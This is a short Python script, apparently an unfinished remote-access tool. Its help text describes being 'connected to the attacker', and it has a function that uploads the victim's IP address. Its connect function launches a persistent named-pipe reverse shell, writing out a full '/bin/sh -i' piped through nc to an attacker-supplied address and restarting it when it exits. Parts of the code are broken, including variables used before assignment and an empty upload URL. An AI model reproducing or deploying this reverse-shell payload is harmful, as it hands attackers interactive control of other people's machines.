#!/usr/bin/env python3
import argparse
import subprocess as sp
import time
import socket
import requests as rq

def main():
    parser = argparse.ArgumentParser(
        description="pls dont misuse this tool"
        )
    
    required = parser.add_argument_group("Required arguments")
    required.add_argument("api", help="API url/ip (eg. 127.0.0.1, 192.168.1.1)")
    required.add_argument("port", help="Port (N for no port)")

    subparsers = parser.add_subparsers(dest='mode')

    target_parser = subparsers.add_parser('-t', help='Be connected to the attacker')
    target_parser.add_argument('port')
    target_parser.add_argument('delay', type=int)

    connect_parser = subparsers.add_parser('-c', help='Connect')
    connect_parser.add_argument('--api-key')

    args = parser.parse_args()

    print(args)

def host(api, key, delay):
    print("Uploading IP")
    ip1 = 0
    while True:
        ip = sp.run(["ipconfig", "ifconfig", "getifaddr", "en0"], capture_output=True, text=True)
        if ip1 != ip:
            print("IP changed")
            rq.patch(f"", data={"ip": ip})
        ip1 = ip
        time.sleep(delay)

def connect(ip, port, delay):
    print(f"Connecting to {ip}:{port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(delay)
    s.connect((ip, port))
    while True:
        time.sleep(delay)
        try:
            if process.poll() is not None:
                print("Process terminated, restarting...")
                process = sp.Popen(f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f", shell=True)
        except Exception:
            print("Exiting...")
            break

if __name__ == "__main__":
    main()
